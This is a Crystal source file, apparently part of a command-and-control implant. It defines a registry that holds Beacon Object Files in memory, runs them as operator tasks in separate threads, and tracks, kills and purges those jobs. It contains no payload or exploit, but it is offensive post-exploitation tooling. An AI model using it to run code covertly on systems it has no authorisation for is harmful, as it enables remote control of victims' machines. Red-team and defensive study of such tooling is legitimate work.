require "./obj"

module Dark::ELF
  # BofRegistry manages Beacon Object Files (BOFs) in memory
  #
  # BOFs are stored as raw bytes and only initialized when executed,
  # which minimizes memory usage and reduces the chance of memory corruption
  # from keeping loaded object files resident.
  class BofRegistry
    # BofEntry stores metadata for a loaded BOF
    #
    # @param raw_bytes [Bytes] The raw binary content of the BOF
    # @param load_time [Time] When the BOF was loaded into the registry
    record BofEntry,
      raw_bytes : Bytes,
      load_time : Time

    # Job stores metadata for a running BOF job
    #
    # @param task_id [String] The task ID from the C2 framework
    # @param bof_name [String] The name of the BOF being executed
    # @param start_time [Time] When the job started
    # @param thread [Thread] The thread executing the BOF
    record Job,
      task_id : String,
      bof_name : String,
      start_time : Time,
      thread : Thread

    # Map of BOF name to loaded BOF entry
    getter bofs = {} of String => BofEntry

    # Map of task ID to active job
    getter active_jobs = {} of String => Job

    # Mutex for thread-safe job tracking
    @@job_mutex = Mutex.new

    # Load a BOF from content and register it without execution
    #
    # @param name [String] Unique identifier for this BOF
    # @param bof_content [Bytes|String] The BOF content as bytes or base64 string
    # @return [String] The name of the loaded BOF
    # @raise [Exception] If the content is invalid
    def load(name : String, bof_content : Bytes | String) : String
      # Convert content to bytes if necessary
      bytes = case bof_content
      when Bytes
        bof_content
      when String
        bof_content.to_slice
      else
        raise "Invalid BOF content type"
      end

      # Log BOF details
      log_debug("Loading BOF '#{name}' (#{bytes.size} bytes)")

      # Store the raw bytes in the registry
      bofs[name] = BofEntry.new(
        raw_bytes: bytes,
        load_time: Time.utc
      )

      return name
    end


    # Execute a loaded BOF in an isolated thread for crash protection
    #
    # This method runs the BOF in a separate OS thread to prevent crashes
    # from affecting the main agent, and provides job tracking capabilities.
    #
    # @param name [String] The name of the BOF to execute
    # @param args [Array<String>] Optional arguments to pass to the BOF
    # @param task_id [String] Optional task ID for job tracking
    # @return [Int32] Status code (0 = success)
    # @raise [Exception] If the BOF is not found or fails to execute
    def execute(name : String, args : Array(String)? = nil, task_id : String? = nil) : Int32
      entry = bofs[name]?
      raise "BOF '#{name}' not found" unless entry

      log_debug("Executing BOF '#{name}' in isolated thread with #{args ? args.size : 0} arguments")

      # Use the args or empty array if none provided
      args_to_use = args || [] of String

      # Create communication channel for thread results
      result_channel = Channel(Int32 | Exception).new(1)

      # Execute BOF in isolated thread
      thread = Thread.new do
        begin
          # Create an ObjectFile instance and execute it in this thread
          obj_data = IO::Memory.new(entry.raw_bytes)
          ObjectFile.new(obj_data, args_to_use)
          result_channel.send(0) # Success
        rescue ex
          log_debug("BOF '#{name}' failed in thread: #{ex.message}")
          result_channel.send(ex)
        ensure
          # Remove job from tracking when thread completes
          if task_id
            @@job_mutex.synchronize do
              active_jobs.delete(task_id)
            end
          end
        end
      end

      # Track the job if task_id is provided
      if task_id
        job = Job.new(
          task_id: task_id,
          bof_name: name,
          start_time: Time.utc,
          thread: thread
        )
        @@job_mutex.synchronize do
          active_jobs[task_id] = job
        end
      end

      # Wait for result
      result = result_channel.receive
      case result
      when Exception
        raise result
      else
        return result.as(Int32)
      end
    end

    # List all active BOF jobs
    #
    # @return [Hash] Map of task ID to job metadata
    def list_jobs : Hash(String, NamedTuple(bof_name: String, start_time: Time, duration: Time::Span))
      @@job_mutex.synchronize do
        result = {} of String => NamedTuple(bof_name: String, start_time: Time, duration: Time::Span)
        current_time = Time.utc
        
        active_jobs.each do |task_id, job|
          result[task_id] = {
            bof_name: job.bof_name,
            start_time: job.start_time,
            duration: current_time - job.start_time
          }
        end
        
        return result
      end
    end

    # Kill a specific BOF job by task ID
    #
    # Note: Crystal doesn't have Thread.kill, so this method marks the job
    # as terminated and removes it from tracking. The actual thread may
    # continue running until it completes or the process exits.
    #
    # @param task_id [String] The task ID of the job to kill
    # @return [Bool] True if the job was found and marked for termination
    def kill_job(task_id : String) : Bool
      @@job_mutex.synchronize do
        job = active_jobs.delete(task_id)
        if job
          log_debug("Marked BOF job '#{task_id}' (#{job.bof_name}) for termination")
          return true
        else
          return false
        end
      end
    end

    # Unload a BOF from registry
    #
    # @param name [String] The name of the BOF to unload
    # @return [Bool] True if the BOF was found and unloaded, false otherwise
    def unload(name : String) : Bool
      entry = bofs.delete(name)
      return false unless entry

      return true
    end

    # List all loaded BOFs
    #
    # @return [Array<String>] Array of names of all loaded BOFs
    def list : Array(String)
      bofs.keys
    end

    # Get detailed information about loaded BOFs
    #
    # @return [Hash] Map of BOF name to metadata including load time
    def status : Hash(String, NamedTuple(load_time: Time))
      result = {} of String => NamedTuple(load_time: Time)

      bofs.each do |name, entry|
        result[name] = {
          load_time: entry.load_time
        }
      end

      return result
    end

    # Purge all loaded BOFs from memory
    #
    # @return [Int32] Number of BOFs that were purged
    def purge : Int32
      count = bofs.size

      # Clear the registry
      bofs.clear

      return count
    end
  end
end